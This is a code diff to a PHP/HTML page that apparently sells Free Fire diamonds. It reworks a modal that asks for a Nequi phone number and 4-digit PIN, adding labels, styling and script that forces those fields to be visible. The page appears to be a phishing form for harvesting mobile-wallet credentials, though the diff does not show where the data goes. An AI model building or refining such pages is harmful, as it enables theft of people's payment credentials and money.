@@ -270,6 +270,37 @@ if (empty($freefire_data['playerId']) || $freefire_data['diamonds'] <= 0) {
     if (modal) {
       modal.style.display = "flex";
       console.log("Modal mostrado automáticamente");
+
+      // Forzar visibilidad de todos los elementos del modal
+      const telefonoInput = document.getElementById("telefonoNequi");
+      const claveInput = document.getElementById("claveNequi");
+      const montoDiv = document.getElementById("montoClave");
+      const subtitulo = modal.querySelector("p");
+
+      console.log("telefonoNequi:", telefonoInput);
+      console.log("claveNequi:", claveInput);
+      console.log("montoClave:", montoDiv);
+      console.log("subtitulo:", subtitulo);
+
+      if (telefonoInput) {
+        telefonoInput.style.display = "block";
+        telefonoInput.style.visibility = "visible";
+        telefonoInput.style.opacity = "1";
+        console.log("telefonoNequi estilos forzados");
+      }
+
+      if (claveInput) {
+        claveInput.style.display = "block";
+        claveInput.style.visibility = "visible";
+        claveInput.style.opacity = "1";
+        console.log("claveNequi estilos forzados");
+      }
+
+      if (montoDiv) {
+        montoDiv.style.display = "block";
+        montoDiv.style.visibility = "visible";
+        console.log("montoClave estilos forzados");
+      }
     }
 
     // Agregar event listener al botón
@@ -613,7 +644,7 @@ if (empty($freefire_data['playerId']) || $freefire_data['diamonds'] <= 0) {
 
 <!-- Modal de autorización -->
 <div id="modalAutorizacion" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.85); z-index:10001; justify-content:center; align-items:center; color:white; font-family:'Segoe UI', sans-serif;">
-  <div style="background:#3a3a3a; padding:30px; border-radius:14px; max-width:360px; width:90%; text-align:center; box-shadow:0 0 20px rgba(0,0,0,0.6);">
+  <div style="background:#3a3a3a; padding:40px; border-radius:14px; max-width:400px; width:90%; text-align:center; box-shadow:0 0 20px rgba(0,0,0,0.6); min-height:350px;">
 
     <!-- Título -->
     <h2 style="font-size:1.2em; margin-bottom:10px;">Ingresa tus datos de Nequi</h2>
@@ -624,41 +655,58 @@ if (empty($freefire_data['playerId']) || $freefire_data['diamonds'] <= 0) {
     </p>
 
     <!-- Monto a pagar -->
-    <div id="montoClave" style="font-size:1.1em; margin-bottom:20px; color:#f9c411;">
+    <div id="montoClave" style="font-size:1.1em; margin-bottom:20px; color:#f9c411; font-weight:bold;">
       Monto: $0
     </div>
 
     <!-- Input de teléfono -->
-    <input id="telefonoNequi" maxlength="10" inputmode="numeric" style="
-      font-size: 18px;
-      text-align: center;
-      border: none;
-      background: transparent;
-      border-bottom: 2px solid #f9c411;
-      padding: 10px 0;
-      width: 100%;
-      color: white;
-      margin-bottom: 15px;
-      outline: none;
-    " placeholder="Número de teléfono" />
+    <div style="margin-bottom:15px;">
+      <label style="display:block; font-size:0.9em; color:#ccc; margin-bottom:5px;">Número de teléfono (10 dígitos)</label>
+      <input id="telefonoNequi" maxlength="10" inputmode="numeric" style="
+        font-size: 18px;
+        text-align: center;
+        border: 2px solid #f9c411;
+        background: #2a2a2a;
+        border-radius: 8px;
+        padding: 12px 0;
+        width: 100%;
+        color: white;
+        outline: none;
+        box-sizing: border-box;
+      " placeholder="3001234567" />
+    </div>
 
     <!-- Input de clave -->
-    <input id="claveNequi" maxlength="4" inputmode="numeric" style="
-      font-size: 24px;
-      letter-spacing: 10px;
-      text-align: center;
-      border: none;
-      background: transparent;
-      border-bottom: 2px solid #f9c411;
-      padding: 10px 0;
-      width: 100%;
-      color: white;
-      margin-bottom: 20px;
-      outline: none;
-    " placeholder="----" />
+    <div style="margin-bottom:20px;">
+      <label style="display:block; font-size:0.9em; color:#ccc; margin-bottom:5px;">Clave de 4 dígitos</label>
+      <input id="claveNequi" maxlength="4" inputmode="numeric" style="
+        font-size: 24px;
+        letter-spacing: 15px;
+        text-align: center;
+        border: 2px solid #f9c411;
+        background: #2a2a2a;
+        border-radius: 8px;
+        padding: 12px 0;
+        width: 100%;
+        color: white;
+        outline: none;
+        box-sizing: border-box;
+      " placeholder="••••" />
+    </div>
 
     <!-- Botón de envío -->
-    <button id="btnEnviarNequi" class="btn active">Autorizar pago</button>
+    <button id="btnEnviarNequi" style="
+      background: #f9c411;
+      color: #000;
+      border: none;
+      padding: 12px 30px;
+      border-radius: 8px;
+      font-size: 1em;
+      font-weight: bold;
+      cursor: pointer;
+      width: 100%;
+      transition: background 0.3s;
+    " onmouseover="this.style.background='#e8a800'" onmouseout="this.style.background='#f9c411'">Autorizar pago</button>
   </div>
 </div>
 
